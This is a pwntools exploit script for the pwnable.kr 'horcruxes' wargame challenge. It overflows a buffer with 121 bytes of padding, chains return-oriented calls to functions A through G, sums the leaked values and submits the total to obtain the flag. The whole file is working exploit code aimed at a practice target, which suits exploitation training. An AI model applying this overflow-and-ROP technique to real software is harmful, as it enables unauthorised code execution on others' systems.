from pwn import *
import argh


"""
this is the gameplan:
    call all of the functions A(), B()..., compute the sum at home, and call the function again.
"""


ADDR = 'pwnable.kr'
PORT = 9032


def start_gdb(p):
    gdb.attach(p, '''
    b *0x080a0038
    display/wx 0x080a2078
    layout regs
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './horcruxes'
    e = ELF(bin_path)

    if local:
        p = process(bin_path)
        # start_gdb(p)
    elif runpwn:
        p = remote(ADDR, PORT)

    offset_to_return_addr = 121
    call_ropme_loc = 0x0809fffc

    p.recvuntil('Select Menu:')

    rop = ROP(e)
    rop.A()
    rop.B()
    rop.C()
    rop.D()
    rop.E()
    rop.F()
    rop.G()
    rop.call(call_ropme_loc)
    raw_rop = rop.generatePadding(0, offset_to_return_addr) + rop.chain()

    p.sendline(raw_rop)
    p.recvuntil('kill Voldemort\n')

    results = [int(res.split()[-1][1:-1]) for res in p.recvlines(7)]
    s = 0
    for res in results:
        s += res
        s &= 0xffffffff
    p.sendline('1234')
    p.sendline(str(s))

    p.recvuntil('earned? : ')
    print(p.recvline())

if __name__ == '__main__':
    argh.dispatch_command(main)

